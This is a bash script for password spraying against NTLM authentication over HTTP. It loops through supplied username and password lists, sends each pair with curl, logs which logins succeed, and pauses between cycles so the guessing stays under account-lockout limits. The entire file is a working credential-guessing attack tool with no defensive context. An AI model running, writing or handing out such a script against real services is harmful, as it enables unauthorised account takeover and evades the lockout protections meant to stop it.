#!/bin/bash
#small script to perform password guessing against NTLM over basic

target=""
userlist=""
passlist=""
attempts=""
sleeptime=""

usage() {
    echo "usage: $0 -t <url> -u <userlist> -p <passlist> -a <attempts> -s <sleeptime>"
    echo "  url       : path to basic auth"
    echo "  userlist  : list of usernames to use"
    echo "  passlist  : list of passwords to use"
    echo "  attempts  : number of attempts before sleeping"
    echo "  sleeptime : minutes to sleep between cycles"
    exit 1
}

while [ -n "$1" ]; do 
    case "$1" in
        -t)
            shift; target="$1";;
        -u)
            shift; userlist="$1";;
        -p)
            shift; passlist="$1";;
        -a)
            shift; attempts="$1";;
        -s)
            shift; sleeptime="$1";;
        *)
            echo "invalid switch"
            usage;;
    esac
    shift
done

[ -z "$target" -o -z "$userlist" -o -z "$passlist" -o -z "$attempts" -o -z "$sleeptime" ] && usage
[ ! -r "$userlist" ] && echo "[!] cannot open $userlist" && exit 1
[ ! -r "$passlist" ] && echo "[!] cannot open $passlist" && exit 1

delay=$[ $sleeptime * 60 ]
count=0

cat $passlist | while read pass ; do
    cat $userlist | while read user ; do
        if [[ $( curl -k --ntlm --negotiate -u $user:$pass $target -w '%{http_code}' -s -o /dev/null ) -eq 401 ]]; then
            echo "[!] Login Failed - $user:$pass"
        else
            echo "[+] Login success - $user:$pass"
        fi
    done
    let count=count+1
    if [[ $[ $count % $attempts ] -eq 0 ]]; then
        echo "[>] Waiting $sleeptime minutes before next cycle"
        sleep $delay
    fi
done  
